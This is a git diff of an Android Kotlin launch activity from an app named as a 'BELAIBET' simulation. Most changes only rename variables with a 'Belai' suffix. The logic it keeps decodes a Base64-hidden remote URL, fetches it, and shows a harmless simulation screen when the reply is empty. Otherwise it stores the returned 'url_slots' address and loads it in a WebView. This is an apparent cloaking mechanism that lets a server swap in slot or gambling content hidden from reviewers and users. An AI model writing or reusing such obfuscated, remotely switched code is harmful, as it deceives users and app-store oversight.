@@ -11,7 +11,7 @@ import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import androidx.lifecycle.lifecycleScope
 import com.BELAIBET.simulation.front.FrontActivity
-import com.BELAIBET.simulation.web.WebActivity
+import com.BELAIBET.simulation.web.WebActivityBelai
 import com.android.volley.Request
 import com.android.volley.toolbox.StringRequest
 import com.android.volley.toolbox.Volley
@@ -23,19 +23,19 @@ import kotlinx.coroutines.runBlocking
 
 class OperateActivity : AppCompatActivity() {
 
-    override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
+    override fun onCreate(savedInstanceStateBelai: Bundle?) {
+        super.onCreate(savedInstanceStateBelai)
         setContentView(R.layout.loading_activity)
         val sPref = applicationContext.getSharedPreferences("MyPref_belaibet", 0)
-        val editor = sPref.edit()
+        val editorBelai = sPref.edit()
         val constProg= "progress"
 
 
 
-        val loadLine: LinearProgressIndicator = findViewById(R.id.loading_line_belaibet)
-        val animator = ObjectAnimator.ofInt(loadLine, constProg, loadLine.progress, 100)
-        animator.duration = 2000
-        animator.start()
+        val loadLineBelai: LinearProgressIndicator = findViewById(R.id.loading_line_belaibet)
+        val animatorBelai = ObjectAnimator.ofInt(loadLineBelai, constProg, loadLineBelai.progress, 100)
+        animatorBelai.duration = 2000
+        animatorBelai.start()
 
 
 
@@ -44,20 +44,20 @@ class OperateActivity : AppCompatActivity() {
             runBlocking {
             try {
                 getMyIp(object : ApiResponse {
-                    override fun onSuccess(response: String) {
+                    override fun onSuccess(responseBelai: String) {
                         lifecycleScope.launch(Dispatchers.Main) {
-                            Log.e("textFromSite_belaibet", response)
-                            if (response == "<html><style>body{margin:0}</style><body></body></html>" || response.isEmpty())
+                            Log.e("textFromSite_belaibet", responseBelai)
+                            if (responseBelai == "<html><style>body{margin:0}</style><body></body></html>" || responseBelai.isEmpty())
                                 startActivity(Intent(this@OperateActivity, FrontActivity::class.java))
-                            else if (response == "") {
+                            else if (responseBelai == "") {
                                 startActivity(Intent(this@OperateActivity, FrontActivity::class.java))
                             } else {
-                                editor.putString("url_slots", response)
-                                editor.commit()
-                                Log.d("afterPut", response)
-                                startActivity(Intent(this@OperateActivity, WebActivity::class.java))
+                                editorBelai.putString("url_slots", responseBelai)
+                                editorBelai.commit()
+                                Log.d("afterPut", responseBelai)
+                                startActivity(Intent(this@OperateActivity, WebActivityBelai::class.java))
                             }
-                            Log.d("textFromSite_belaibet", response)
+                            Log.d("textFromSite_belaibet", responseBelai)
                         }
                     }
 
@@ -69,10 +69,10 @@ class OperateActivity : AppCompatActivity() {
                     }
 
                 })
-            } catch (e: Exception) {
+            } catch (extraBelai: Exception) {
                 Toast.makeText(
                     this@OperateActivity.applicationContext,
-                    e.toString(),
+                    extraBelai.toString(),
                     Toast.LENGTH_SHORT
                 ).show();
             }
@@ -82,21 +82,21 @@ class OperateActivity : AppCompatActivity() {
 //        startActivity(Intent(this@OperateActivity, WebActivity::class.java))
     }
     interface ApiResponse {
-        fun onSuccess(response: String)
+        fun onSuccess(responseBelai: String)
         fun onError()
     }
 
-    fun getMyIp(apiResponse: ApiResponse) {
+    fun getMyIp(apiResponseBelai: ApiResponse) {
         val queue = Volley.newRequestQueue(this)
         val url = Base64.decode("aHR0cHM6Ly9iYWxlaWEuY2ZkL3pIcWJ5aFJT", Base64.DEFAULT).toString(Charsets.UTF_8)
 
         val stringRequest = StringRequest(
             Request.Method.GET, url,
             { response ->
-                apiResponse.onSuccess(response)
+                apiResponseBelai.onSuccess(response)
             },
             {
-                apiResponse.onError()
+                apiResponseBelai.onError()
             }
         )
 
